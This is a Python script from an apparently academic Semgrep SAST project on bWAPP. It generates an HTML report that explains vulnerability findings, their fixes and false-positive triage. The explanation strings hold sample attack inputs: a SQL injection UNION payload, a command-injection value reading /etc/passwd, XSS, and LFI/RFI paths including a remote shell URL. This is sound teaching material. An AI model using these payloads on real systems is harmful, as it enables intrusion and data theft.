"""
build_report.py — Genera el reporte navegable (T8) a partir de los resultados reales.

Lee  : semgrep/summary.json, semgrep/findings.json, semgrep/*.yml, evidencias/*.log,
       y el código de bWAPP (para mostrar el contexto de los hallazgos destacados).
Usa  : reporte/template.html
Crea : reporte/index.html  (documento autocontenido, funciona sin servidor ni Internet*)
       --fragment RUTA     (opcional) la misma página sin <html>/<head>/<body>,
                           para publicarla como Artifact.
       * sin Internet las fuentes caen a las del sistema.

Uso: python reporte/build_report.py [--fragment salida.html]
"""
import argparse
import html
import json
import os
import re
import subprocess

from ruamel.yaml import YAML

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
J = lambda *p: os.path.join(ROOT, *p)  # noqa: E731
AUTHOR = "Walter Sánchez"
PROGRAM = "Maestría en Seguridad Informática (MASI 2026)"
COURSE = "Seguridad en Aplicaciones"
UNIVERSITY = "Universidad Mariano Gálvez de Guatemala"
REPO_URL = "https://github.com/WsanchezF/SAST_Semgrep_bWAPP"
PAGES_URL = "https://wsanchezf.github.io/SAST_Semgrep_bWAPP/"


# --------------------------------------------------------------------------- #
def read_lines(rel):
    full = J("bWAPP", rel)
    try:
        with open(full, encoding="latin-1") as fh:
            return fh.read().splitlines()
    except OSError:  # bloqueado por el antivirus en Windows -> leer desde git
        out = subprocess.run(["git", "-C", J("bWAPP"), "show", f"HEAD:{rel}"],
                             capture_output=True).stdout.decode("latin-1")
        return out.splitlines()


def context(rel, ranges):
    lines = read_lines(rel)
    out = []
    for a, b in ranges:
        if out:
            out.append({"n": None, "t": "…"})
        for i in range(a, b + 1):
            if i - 1 < len(lines) and lines[i - 1].strip():
                out.append({"n": i, "t": lines[i - 1].rstrip().replace("\t", "    ")})
    # quitar indentación común
    ind = min((len(x["t"]) - len(x["t"].lstrip()) for x in out if x["n"]), default=0)
    for x in out:
        if x["n"]:
            x["t"] = x["t"][ind:]
    return out


# --------------------------------------------------------------------------- #
# T5 — hallazgos destacados (contenido redactado; ubicación y severidad salen del JSON)
KEY_FINDINGS = [
    dict(file="app/sqli_1.php", rule="php-sql-injection", ctx=[(141, 145)],
         title="Inyección SQL en la búsqueda de películas",
         flow=['$_GET["title"]', "$title", "sqli($title)", "$sql", "mysql_query($sql)"],
         why="En el nivel de seguridad bajo, sqli() llama a no_check(), que devuelve el dato sin cambios. "
             "El atacante cierra la comilla y anexa su propia consulta, por ejemplo "
             "' UNION SELECT 1,login,password,email,secret,1,1 FROM users-- - para volcar la tabla de usuarios.",
         fix="Consultas preparadas: el valor viaja separado de la sentencia SQL y nunca se interpreta como código.",
         fixcode='$stmt = $mysqli->prepare("SELECT * FROM movies WHERE title LIKE ?");\n'
                 '$like = "%" . $_GET["title"] . "%";\n$stmt->bind_param("s", $like);\n'
                 '$stmt->execute();\n$recordset = $stmt->get_result();'),
    dict(file="app/commandi.php", rule="php-command-injection", ctx=[(128, 128), (140, 140)],
         title="Inyección de comandos del sistema operativo",
         flow=['$_POST["target"]', "$target", "commandi($target)", 'shell_exec("nslookup " . …)'],
         why="El dominio escrito por el usuario se concatena a una línea de comandos. "
             "Con target=www.example.com; cat /etc/passwd el servidor ejecuta un segundo comando (RCE).",
         fix="No invocar la shell: usar la función nativa de PHP. Si fuera inevitable, validar contra lista blanca "
             "y escapar con escapeshellarg().",
         fixcode='$target = filter_var($_POST["target"], FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME);\n'
                 'if ($target === false) { exit("Dominio no válido"); }\n'
                 '$records = dns_get_record($target, DNS_A);   // sin shell'),
    dict(file="app/php_eval.php", rule="php-code-injection-eval", ctx=[(82, 82)],
         title="Ejecución de código PHP con eval()",
         flow=['$_REQUEST["eval"]', "eval(…)"],
         why="Cualquier código PHP enviado en el parámetro eval se ejecuta en el servidor: es una webshell. "
             "El propio Windows Defender pone este archivo en cuarentena al clonarlo, por eso el escaneo oficial "
             "se hizo dentro de Docker.",
         fix="Eliminar eval(). No existe un uso seguro de eval() con datos que vienen del usuario.",
         fixcode='// Eliminar la funcionalidad. Si se necesita evaluar algo,\n'
                 '// usar una lista cerrada de operaciones permitidas:\n'
                 '$ops = ["fecha" => fn() => date("Y-m-d")];\n'
                 '$op  = $_REQUEST["op"] ?? "";\n'
                 'echo isset($ops[$op]) ? htmlspecialchars($ops[$op]()) : "Operación no permitida";'),
    dict(file="app/xss_get.php", rule="php-reflected-xss", ctx=[(131, 132), (144, 144)],
         title="XSS reflejado en el saludo",
         flow=['$_GET["firstname"]', "$firstname", "xss($firstname)", "echo"],
         why="El nombre se imprime en el HTML sin codificar. "
             "Un enlace con firstname=<script>…</script> ejecuta JavaScript en el navegador de la víctima "
             "(robo de sesión, phishing).",
         fix="Codificar toda salida HTML según su contexto y añadir una Content-Security-Policy.",
         fixcode='$e = fn($v) => htmlspecialchars($v, ENT_QUOTES, "UTF-8");\n'
                 'echo "Welcome " . $e($firstname) . " " . $e($lastname);'),
    dict(file="app/rlfi.php", rule="php-file-inclusion", line=174, ctx=[(56, 56), (171, 174)],
         title="Inclusión de archivos local / remota (LFI/RFI)",
         flow=['$_GET["language"]', "$language", "include($language)"],
         why="El usuario elige qué archivo se incluye y ejecuta: ?language=../../../../etc/passwd lee archivos "
             "del servidor y, si allow_url_include está activo, ?language=http://atacante/shell.txt ejecuta "
             "código remoto.",
         fix="Mapear la opción del usuario a una lista blanca cerrada; nunca usar el valor como ruta.",
         fixcode='$langs = ["en" => "lang_en.php", "fr" => "lang_fr.php", "nl" => "lang_nl.php"];\n'
                 '$key = $_GET["language"] ?? "en";\n'
                 'include __DIR__ . "/" . ($langs[$key] ?? $langs["en"]);'),
    dict(file="app/unvalidated_redir_fwd_1.php", rule="php-open-redirect", ctx=[(76, 76), (82, 82)],
         title="Redirección abierta",
         flow=['$_REQUEST["url"]', 'header("Location: " . …)'],
         why="El sitio redirige a cualquier URL recibida. Sirve para campañas de phishing que usan el dominio "
             "legítimo como trampolín (https://sitio-real/…?url=https://sitio-falso).",
         fix="Redirigir por identificador a destinos de una lista blanca.",
         fixcode='$dest = ["home" => "portal.php", "blog" => "https://blog.example.com/"];\n'
                 'header("Location: " . ($dest[$_REQUEST["to"] ?? ""] ?? "portal.php"));\nexit;'),
    dict(file="app/admin/settings.php", rule="php-hardcoded-credentials", ctx=[(53, 56)],
         title="Credenciales embebidas en el panel admin",
         flow=['"bug"', "$password"],
         why="La contraseña estática bee/bug está en el código fuente: cualquiera con acceso al repositorio "
             "(o a una copia filtrada) la conoce, y no se puede rotar sin desplegar código.",
         fix="Leer secretos de variables de entorno o de un gestor de secretos; rotar la credencial expuesta.",
         fixcode='$login    = getenv("BWAPP_STATIC_LOGIN");\n'
                 '$password = getenv("BWAPP_STATIC_PASSWORD");   // definido fuera del repositorio\n'
                 'if ($password === false) { throw new RuntimeException("Secreto no configurado"); }'),
    dict(file="app/soap/class.wsdlcache.php", rule="php-insecure-deserialization", ctx=[(99, 101), (109, 109)],
         title="Deserialización insegura en la caché WSDL (NuSOAP)",
         flow=["archivo de caché", "$s", "unserialize($s)"],
         why="NuSOAP 0.9.5 (2010) deserializa sin restricciones lo que lee del directorio de caché. Si un atacante "
             "puede escribir en ese directorio (permisos laxos, otra vulnerabilidad de subida), inyecta un objeto "
             "PHP malicioso (POP chain). Es un riesgo de componente de terceros sin mantenimiento.",
         fix="Reemplazar NuSOAP por la extensión SOAP nativa o una librería mantenida; si se conserva, "
             "restringir clases y verificar integridad.",
         fixcode='$obj = unserialize($s, ["allowed_classes" => ["wsdl"]]);\n'
                 '// mejor aún: guardar la caché como JSON firmado con HMAC y\n'
                 '// verificar hash_equals() antes de usarla'),
]

TRIAGE_CASES = [
    dict(code="FP-1", rule="php-weak-crypto", main=True,
         where="soap/class.soap_transport_http.php:475, :586 · soap/nusoap.php:2629, :2740",
         what="base64_encode() al armar la cabecera Authorization: Basic",
         why="RFC 7617 obliga a codificar usuario:contraseña en Base64 en HTTP Basic. No es un intento de cifrar: "
             "es el formato del protocolo. El riesgo real ahí es enviar Basic sin TLS (CWE-319), que es otro hallazgo.",
         adjust="pattern-not-inside: $O->setHeader(\"=~/(?i)^(proxy-)?authorization$/\", ...)"),
    dict(code="FP-2", rule="php-weak-hash",
         where="soap/class.wsdlcache.php (8) · soap/nusoapmime.php (2) · tokens sha1(uniqid(mt_rand())) en Core",
         what="md5()/sha1() usados como nombre de archivo de caché, clave de arreglo o Content-ID",
         why="Ahí el hash no protege nada: solo genera un identificador. Los tokens sha1(uniqid(mt_rand())) sí "
             "son un problema, pero de aleatoriedad predecible (CWE-330), no de hash débil: se reclasifican.",
         adjust="metavariable-regex sobre el argumento: solo si contiene pass|secret|token|code|key|digest…"),
    dict(code="FP-3", rule="php-file-inclusion",
         where="app/rlfi.php:167",
         what="include($language) dentro de if(in_array($language, $available_languages))",
         why="Es la versión de nivel medio/alto: el valor se valida contra una lista blanca antes del include. "
             "El motor taint no entiende esa guarda condicional.",
         adjust="pattern-not-inside: if (in_array($V, ...)) { ... }"),
    dict(code="FP-4", rule="php-open-redirect",
         where="app/restrict_folder_access.php:48, :53",
         what='header("Content-Disposition: …") y header("Content-Length: " . filesize($file))',
         why="Son cabeceras de descarga, no redirecciones. El sink header(...) era demasiado amplio.",
         adjust='metavariable-regex: el primer argumento debe empezar por "Location:"'),
    dict(code="FP-5", rule="php-reflected-xss",
         where="sqli_1/2/6/9/11/13.php, ldapi.php, xss_login.php, sqli_3/16.php, hpp-3.php… (36)",
         what='echo $row["title"], echo $message (armado con $row["login"])',
         why="El dato sale de la base de datos o de LDAP, no de la petición: no es XSS reflejado sino un posible "
             "XSS almacenado (segundo orden). Se reclasifica para revisarlo con otra regla, no se ignora.",
         adjust="pattern-sanitizers: mysql_fetch_*(), $R->fetch_*(), ldap_get_entries()"),
    dict(code="FP-6", rule="php-hardcoded-credentials",
         where="app/top_security.php:24",
         what='$secret = "PGk+PHA+U2VjdXJl…"',
         why="Es un mensaje HTML codificado en Base64 (\"<i><p>Secure the world…\"), no una credencial. "
             "Caso aislado: se propone suprimirlo en línea sin tocar la regla (el código auditado no se modificó).",
         adjust="// nosemgrep: php-hardcoded-credentials   (supresión puntual propuesta)"),
]

EXPLAINED_RULES = {
    "php-sql-injection": "Regla taint. Semgrep marca como contaminado todo lo que sale de $_GET, $_POST, "
                         "$_REQUEST o $_COOKIE y sigue ese dato por asignaciones y concatenaciones. Si llega a "
                         "mysql_query(), mysqli_query() o ->query() sin pasar por un sanitizador (intval, cast a "
                         "int), reporta. Así distingue una consulta con datos del usuario de una consulta fija, cosa "
                         "que una búsqueda de texto no puede hacer.",
    "php-weak-hash": "Regla de patrón. pattern-either agrupa cuatro formas equivalentes de pedir MD5 o SHA-1 "
                     "(md5(), sha1(), hash(\"md5\",…), hash(\"sha1\",…)). Los puntos suspensivos (...) aceptan "
                     "cualquier argumento. No sigue datos: reporta cada uso, por eso necesita triaje (ver FP-2).",
    "php-hardcoded-credentials": "Regla de patrón con metavariables. $VAR = \"...\" captura cualquier asignación de "
                                 "un literal; metavariable-regex exige que el nombre de la variable contenga pass, "
                                 "pwd, secret, api_key o token, y pattern-not descarta la cadena vacía. La segunda "
                                 "rama cubre define(\"DB_PASSWORD\", \"…\").",
}


# --------------------------------------------------------------------------- #
def load_rules(path):
    data = YAML(typ="safe").load(open(path, encoding="utf-8"))
    out = []
    for r in data["rules"]:
        md = r.get("metadata", {})
        out.append({
            "id": r["id"], "mode": "taint" if r.get("mode") == "taint" else "patrón",
            "severity": {"ERROR": "Alta", "WARNING": "Media", "INFO": "Baja"}[r["severity"]],
            "owasp": md.get("owasp"), "cwe": md.get("cwe"), "vuln_class": md.get("vuln_class"),
            "message": " ".join(str(r.get("message", "")).split()),
        })
    return out


def rule_yaml_block(path, rule_id):
    text = open(path, encoding="utf-8").read()
    m = re.search(rf"(?ms)^  - id: {re.escape(rule_id)}\n.*?(?=^  # -{{20,}}|\Z)", text)
    return m.group(0).rstrip() if m else ""


def read_log(name):
    p = J("evidencias", name)
    if not os.path.exists(p):
        return ""
    raw = open(p, "rb").read()
    for enc in ("utf-8-sig", "utf-16", "latin-1"):
        try:
            return raw.decode(enc).replace("\r\n", "\n").strip()
        except UnicodeDecodeError:
            continue
    return ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fragment", help="escribir también la versión sin <html>/<head>/<body>")
    args = ap.parse_args()

    summary = json.load(open(J("semgrep", "summary.json"), encoding="utf-8"))
    findings = json.load(open(J("semgrep", "findings.json"), encoding="utf-8"))
    rules = load_rules(J("semgrep", "php-sast-rules.yml"))
    extra_rules = load_rules(J("semgrep", "extra", "php-extra-rules.yml"))
    by_rule = summary["by_rule"]
    for r in rules:
        r["count"] = by_rule.get(r["id"], 0)
    for r in extra_rules:
        r["count"] = sum(1 for f in summary["extra"]["findings"] if f["rule"] == r["id"])

    key = []
    for k in KEY_FINDINGS:
        f = next((f for f in findings if f["file"] == k["file"] and f["rule"] == k["rule"]
                  and f["line"] == k.get("line", f["line"])), None)
        if f is None:
            raise SystemExit(f"No se encontró el hallazgo {k['file']} / {k['rule']}")
        key.append({**k, "id": f["id"], "line": f["line"], "severity": f["severity"], "owasp": f["owasp"],
                    "cwe": f["cwe"], "project": f["project"], "vuln_class": f["vuln_class"],
                    "code": context(k["file"], k["ctx"]), "hl": f["line"]})

    tri = summary.get("triage", {})
    tri_counts = {r["rule"]: (r["v1"], r["v2"]) for r in tri.get("by_rule", [])}
    cases = [{**c, "v1": tri_counts.get(c["rule"], (0, 0))[0], "v2": tri_counts.get(c["rule"], (0, 0))[1]}
             for c in TRIAGE_CASES]
    fp1 = next(f for f in findings if f["file"] == "app/soap/class.soap_transport_http.php"
               and f["rule"] == "php-weak-crypto")

    commit = subprocess.run(["git", "-C", J("bWAPP"), "log", "-1", "--format=%H|%cs"],
                            capture_output=True, text=True).stdout.strip().split("|")

    data = {
        "summary": summary, "findings": findings, "rules": rules, "extraRules": extra_rules,
        "key": key, "triage": cases,
        "fp1": {"id": fp1["id"], "file": fp1["file"], "line": fp1["line"],
                "code": context(fp1["file"], [(fp1["line"], fp1["line"])])},
        "yaml": {
            "explained": {rid: {"text": EXPLAINED_RULES[rid],
                                "yaml": rule_yaml_block(J("semgrep", "php-sast-rules.yml"), rid)}
                          for rid in EXPLAINED_RULES},
            "fp1_before": rule_yaml_block(J("semgrep", "php-sast-rules.yml"), "php-weak-crypto"),
            "fp1_after": rule_yaml_block(J("semgrep", "php-sast-rules-v2.yml"), "php-weak-crypto"),
            "extra": open(J("semgrep", "extra", "php-extra-rules.yml"), encoding="utf-8").read(),
            "ci": open(J(".github", "workflows", "semgrep.yml"), encoding="utf-8").read()
                  if os.path.exists(J(".github", "workflows", "semgrep.yml")) else "",
        },
        "logs": {
            "t1w": read_log("T1_entorno_windows.log"), "t1d": read_log("T1_entorno_docker.log"),
            "t2": read_log("T2_pruebas_reglas.log"), "t3": read_log("T3_escaneo.log"),
            "t3w": read_log("T3_control_cruzado_windows.log"), "t6": read_log("T6_reescaneo_v2.log"),
            "extra": read_log("EXTRA_reglas_nuevas.log"),
        },
        "meta": {"commit": commit[0], "commit_short": commit[0][:7],
                 "commit_date": commit[1] if len(commit) > 1 else ""},
    }

    t = summary["totals"]
    pp = summary["per_project"]
    a03 = summary["by_owasp"].get("A03:2021 - Injection", 0)
    gen = summary["generated"]
    vals = {
        "author": AUTHOR, "program": PROGRAM, "course": COURSE, "university": UNIVERSITY,
        "repo_url": REPO_URL, "pages_url": PAGES_URL,
        "date": f"{gen[8:10]}/{gen[5:7]}/{gen[:4]}",
        "version": summary["semgrep_version"], "commit": data["meta"]["commit_short"],
        "commit_date": data["meta"]["commit_date"],
        "total": t["findings"], "files": t["files_scanned"], "risk": t["risk_index"],
        "risk_pf": f"{t['risk_per_file']:.2f}".replace(".", ","),
        "alta": t["by_severity"]["Alta"], "media": t["by_severity"]["Media"], "baja": t["by_severity"]["Baja"],
        "alta_pct": round(100 * t["by_severity"]["Alta"] / t["findings"]),
        "a03": a03, "a03_pct": round(100 * a03 / t["findings"]),
        "v2": tri.get("v2_total", t["findings"]), "removed": tri.get("removed_total", 0),
        "extra": summary["extra"]["total"],
        "core_n": pp["core"]["findings"], "core_files": pp["core"]["files"], "core_alta": pp["core"]["by_severity"]["Alta"],
        "admin_n": pp["admin"]["findings"], "soap_n": pp["soap"]["findings"],
        "sqli": summary["by_class"].get("SQL Injection", 0),
        "xss": summary["by_class"].get("Reflected XSS", 0),
        "hash": summary["by_class"].get("Weak Hash", 0),
        "eval": summary["by_class"].get("Code Injection (eval)", 0),
        "cmd": summary["by_class"].get("Command Injection", 0),
        "lfi": summary["by_class"].get("File Inclusion (LFI/RFI)", 0),
        "upload": summary["extra"]["by_rule"].get("Unrestricted File Upload", 0),
        "trav": summary["extra"]["by_rule"].get("Path Traversal", 0),
        "xss_v2": tri_counts.get("php-reflected-xss", (0, 0))[1],
        "hash_v2": tri_counts.get("php-weak-hash", (0, 0))[1],
        "creds": summary["by_class"].get("Hardcoded Credentials", 0),
        "fp1_id": fp1["id"],
        "rce": sum(summary["by_class"].get(c, 0) for c in
                   ("Code Injection (eval)", "Command Injection", "File Inclusion (LFI/RFI)"))
               + summary["extra"]["by_rule"].get("Unrestricted File Upload", 0),
    }

    tpl = open(J("reporte", "template.html"), encoding="utf-8").read()
    tpl = re.sub(r"\{\{(\w+)\}\}", lambda m: html.escape(str(vals[m.group(1)])), tpl)
    payload = json.dumps(data, ensure_ascii=False).replace("</", "<\\/")
    tpl = tpl.replace("/*__DATA__*/null", payload)
    head, body = tpl.split("<!--BODY-->", 1)

    full = ("<!doctype html>\n<html lang=\"es\">\n<head>\n<meta charset=\"utf-8\">\n"
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, viewport-fit=cover\">\n"
            + head + "\n</head>\n<body>\n" + body + "\n</body>\n</html>\n")
    with open(J("reporte", "index.html"), "w", encoding="utf-8") as fh:
        fh.write(full)
    print(f"reporte/index.html  ({len(full) / 1024:.0f} KB)")
    if args.fragment:
        with open(args.fragment, "w", encoding="utf-8") as fh:
            fh.write(head + "\n" + body)
        print(f"fragmento: {args.fragment}")


if __name__ == "__main__":
    main()
